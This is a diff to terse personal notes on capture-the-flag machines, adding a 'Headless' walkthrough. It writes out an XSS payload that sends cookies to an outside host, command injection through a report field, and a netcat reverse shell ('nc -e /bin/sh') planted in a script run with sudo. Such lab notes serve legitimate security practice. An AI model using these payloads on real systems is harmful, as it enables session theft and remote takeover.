@@ -17,6 +17,15 @@ ncat -lvnp 9001 > backup.7z
   login and check the version, search on searchploit then run!
   got the root!
 
+# Headless Machine:
+  check dirb, got /support and /dashboard
+  /dashboard need admin cookie, add this script to body request: <script>document.location='http://ip/?cookie='+document.cookie</script>
+  check /dashboard and replace the admin cookie. got the report with body request
+  report=id;pwd -> reverse shell with netcat
+  sudo -l, got the /usr/bin/syscheck -> add this script: echo "nc -e /bin/sh 10.10.16.11 8500" > initdb.sh
+  chmod +x initdb.sh
+  sudo /usr/bin/syscheck
+
 #v Valentine Machine:
   check nmap --script vuln, then got CVE the ssl vulnerability
   dirb got /dev contain notes and hype.key
